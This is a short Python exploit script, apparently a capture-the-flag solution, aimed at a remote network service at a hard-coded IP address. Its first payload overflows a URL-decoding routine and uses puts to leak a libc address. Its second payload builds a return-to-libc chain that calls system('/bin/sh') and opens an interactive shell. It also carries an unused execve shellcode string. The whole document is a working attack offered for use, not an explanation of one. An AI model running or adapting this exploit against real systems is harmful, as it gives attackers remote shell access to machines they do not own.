#!/usr/bin/env python
#encoding:utf-8

import zio
from time import sleep

def NOPS(n):
    return 'A' * n

def LEFT_PAD(s, n):
    return NOPS(n - len(s)) + s

def RIGHT_PAD(s, n):
    return s + NOPS(n - len(s))

DELAY = 1
JMP06 = '\xeb\x06'
SHELLCODE = "j\x0bX\x991\xc9Rh//shh/bin\x89\xe3\xcd\x80"

def RAW_WITH_DELAY(s):
    sleep(DELAY)
    return str(s)

def NONE_WITH_DELAY(s):
    sleep(DELAY)
    return ''


TARGET = ('119.254.101.197', 10001)
LEN_TO_RET = 0x9c
PUTS_PLT = 0x08048530
PUTS_GOT = 0x08049de8
RESTART_ADDR = 0x08048590
PUTS_LIBC = 0x00065650
SYSTEM_LIBC = 0x00040190
BINSH_LIBC = 0x00160A24


# TARGET = ('10.211.55.32', 8888)

io = zio.zio(TARGET)
io.read_until_timeout()
payload = 'http://%\x001'
payload += NOPS(LEN_TO_RET - 8)
payload += zio.l32(PUTS_PLT) + zio.l32(RESTART_ADDR) + zio.l32(PUTS_GOT)
io.writeline(payload)
io.read_until('Decode Result:')
io.readline()

puts_addr = zio.l32(io.read(4))
print hex(puts_addr)
libc_addr = puts_addr - PUTS_LIBC
system_addr = libc_addr + SYSTEM_LIBC
binsh_addr = libc_addr + BINSH_LIBC

io.read_until_timeout()
payload = 'http://%\x001'
payload += NOPS(LEN_TO_RET - 8)
payload += zio.l32(system_addr) + zio.l32(RESTART_ADDR) + zio.l32(binsh_addr)
io.writeline(payload)

io.interact()
